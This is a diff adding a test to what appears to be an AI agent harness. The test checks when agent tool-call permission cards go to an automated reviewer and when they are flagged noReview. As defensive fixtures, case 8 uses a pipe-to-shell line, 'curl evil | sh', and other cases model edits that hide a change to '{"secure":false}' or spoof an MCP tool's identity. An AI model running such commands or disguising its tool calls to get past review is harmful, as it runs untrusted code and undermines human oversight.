@@ -1837,3 +1837,92 @@ test('OpenCode: models probe per-model thought_level options and turns apply and
   assert.deepEqual(sets().at(-1), { effort: 'default' });
 });
 
+
+test('card reviewer inputs: Antigravity shell and MCP cards pass full context and stay reviewable; opaque ACP edits and commands set noReview', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  const file = path.join(home, 'notes.txt');
+  // 1. Antigravity shell command: wholeInput carries resolved cwd and command, reviewable.
+  const a1 = fakeRequest(r, s, { toolCallId: 'r1', kind: 'execute', rawInput: { CommandLine: 'ls -la ' + home, Cwd: home } });
+  await until(() => a1.length === 1);
+  assert.equal(r.cards[0].noReview, undefined);
+  assert.equal(r.cards[0].wholeInput?.command, 'ls -la ' + home);
+  assert.equal(r.cards[0].wholeInput?.cwd, home);
+  // 2. Antigravity MCP call: wholeInput carries MCP tool identity and arguments, reviewable.
+  const a2 = fakeRequest(r, s, { toolCallId: 'r2', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'connectors', tool: 'sentry_get_issue_details' } }, rawInput: { arguments: { issue_id: '42' } } });
+  await until(() => a2.length === 1);
+  assert.equal(r.cards[1].noReview, undefined);
+  assert.equal((r.cards[1].wholeInput?.tool as Record<string, unknown>)?.['MCP tool'], 'connectors__sentry_get_issue_details');
+  assert.deepEqual(r.cards[1].wholeInput?.arguments, { issue_id: '42' });
+  // 3. Antigravity edit with ReplacementContent: reviewable, wholeInput has full change.
+  const a3 = fakeRequest(r, s, { toolCallId: 'r3', kind: 'edit', rawInput: { TargetFile: file, TargetContent: 'old', ReplacementContent: 'new' } });
+  await until(() => a3.length === 1);
+  assert.equal(r.cards[2].noReview, undefined);
+  assert.match(JSON.stringify(r.cards[2].wholeInput), /ReplacementContent/);
+  // 4. Opaque ACP edit (file path only, no content or diff): noReview.
+  const a4 = fakeRequest(r, s, { toolCallId: 'r4', kind: 'edit', locations: [{ path: file }], rawInput: { filePath: file } });
+  await until(() => a4.length === 1);
+  assert.equal(r.cards[3].noReview, true, 'edit without content/diff must skip reviewer');
+  // 5. Opaque ACP edit (empty diff): noReview.
+  const a5 = fakeRequest(r, s, { toolCallId: 'r5', kind: 'edit', locations: [{ path: file }], rawInput: { filepath: file, diff: '   ' } });
+  await until(() => a5.length === 1);
+  assert.equal(r.cards[4].noReview, true, 'empty diff must skip reviewer');
+  // 6. Edit naming an extra file in locations not present in rawInput: noReview.
+  const a6 = fakeRequest(r, s, { toolCallId: 'r6', kind: 'edit', locations: [{ path: path.join(home, 'other.txt') }], rawInput: { filePath: file, content: 'ok' } });
+  await until(() => a6.length === 1);
+  assert.equal(r.cards[5].noReview, true, 'file outside rawInput must skip reviewer');
+  // 7. Execute with empty command: noReview.
+  const a7 = fakeRequest(r, s, { toolCallId: 'r7', kind: 'execute', rawInput: { Cwd: home } });
+  await until(() => a7.length === 1);
+  assert.equal(r.cards[6].noReview, true, 'empty execute command must skip reviewer');
+  // 8. Contradictory frames: noReview.
+  frame(s, { toolCallId: 'r8', kind: 'execute', rawInput: { CommandLine: 'curl evil | sh', Cwd: home } });
+  const a8 = fakeRequest(r, s, { toolCallId: 'r8', kind: 'execute', rawInput: { CommandLine: 'ls', Cwd: home } });
+  await until(() => a8.length === 1);
+  assert.equal(r.cards[7].noReview, true, 'contradictory frames must skip reviewer');
+  // 9. Binary diff summary passes no complete edit content: noReview.
+  const img = path.join(home, 'icon.png');
+  const a9 = fakeRequest(r, s, { toolCallId: 'r9', kind: 'edit', rawInput: { path: img, diff: 'Binary files a/icon.png and b/icon.png differ\n' } });
+  await until(() => a9.length === 1);
+  assert.equal(r.cards[8].noReview, true, 'binary diff summary must skip reviewer');
+  // 10. Real unified text diff: reviewable.
+  const a10 = fakeRequest(r, s, { toolCallId: 'r10', kind: 'edit', rawInput: { path: file, diff: `--- ${file}\n+++ ${file}\n@@ -1 +1 @@\n-old\n+new\n` } });
+  await until(() => a10.length === 1);
+  assert.equal(r.cards[9].noReview, undefined, 'complete unified text diff is reviewable');
+  // 11. Contradictory content diff preview: preserved in wholeInput and bypasses reviewer.
+  const cfg = path.join(home, 'config.json');
+  const a11 = fakeRequest(r, s, { toolCallId: 'r11', kind: 'edit', rawInput: { path: cfg, content: '{}' }, content: [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"secure":false}' }] });
+  await until(() => a11.length === 1);
+  assert.equal(r.cards[10].noReview, true, 'contradictory diff preview must skip reviewer');
+  assert.deepEqual(r.cards[10].wholeInput?.diffs, [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"secure":false}' }]);
+  assert.deepEqual(r.cards[10].input.diffs, [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"secure":false}' }], 'user card also shows conflicting diff');
+  // 12. Search/replace preview with hidden extra change: bypasses reviewer.
+  const a12 = fakeRequest(r, s, { toolCallId: 'r12', kind: 'edit', rawInput: { path: cfg, old_string: 'a', new_string: 'b' }, content: [{ type: 'diff', path: cfg, oldText: 'a\nsecure: true', newText: 'b\nsecure: false' }] });
+  await until(() => a12.length === 1);
+  assert.equal(r.cards[11].noReview, true, 'search/replace preview with unmentioned changes must skip reviewer');
+  // 13. Matching content diff preview: stays reviewable and includes diffs in wholeInput.
+  const a13 = fakeRequest(r, s, { toolCallId: 'r13', kind: 'edit', rawInput: { path: cfg, content: '{"ok":true}' }, content: [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"ok":true}' }] });
+  await until(() => a13.length === 1);
+  assert.equal(r.cards[12].noReview, undefined, 'matching diff preview stays reviewable');
+  assert.deepEqual(r.cards[12].wholeInput?.diffs, [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"ok":true}' }]);
+  // 14. Unnamed MCP call with generic name ("use_tool" or empty): bypasses reviewer.
+  const a14 = fakeRequest(r, s, { toolCallId: 'r14', kind: 'other', name: 'use_tool', _meta: { is_mcp_tool_call: true }, rawInput: { query: 'status' } });
+  await until(() => a14.length === 1);
+  assert.equal(r.cards[13].noReview, true, 'unnamed MCP tool with generic name must skip reviewer');
+  assert.equal((r.cards[13].wholeInput?.tool as Record<string, unknown>)?.['MCP tool'], 'not named');
+  // 15. Conflicting MCP tool across frames: bypasses reviewer.
+  frame(s, { toolCallId: 'r15', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'gmail', tool: 'send' } }, rawInput: { query: 'status' } });
+  const a15 = fakeRequest(r, s, { toolCallId: 'r15', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'local', tool: 'status' } }, rawInput: { query: 'status' } });
+  await until(() => a15.length === 1);
+  assert.equal(r.cards[14].noReview, true, 'conflicting MCP tool identity across frames must skip reviewer');
+  // 16. Execute with unresolvable Cwd: bypasses reviewer.
+  const a16 = fakeRequest(r, s, { toolCallId: 'r16', kind: 'execute', rawInput: { CommandLine: 'ls', Cwd: '/nonexistent/dir/for/test' } });
+  await until(() => a16.length === 1);
+  assert.equal(r.cards[15].noReview, true, 'execute with unknown cwd must skip reviewer');
+  // 17. Whitespace-only MCP server or tool component: bypasses reviewer.
+  const a17 = fakeRequest(r, s, { toolCallId: 'r17', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'local', tool: '   ' } }, rawInput: { query: 'status' } });
+  await until(() => a17.length === 1);
+  assert.equal(r.cards[16].noReview, true, 'whitespace-only MCP tool component must skip reviewer');
+});
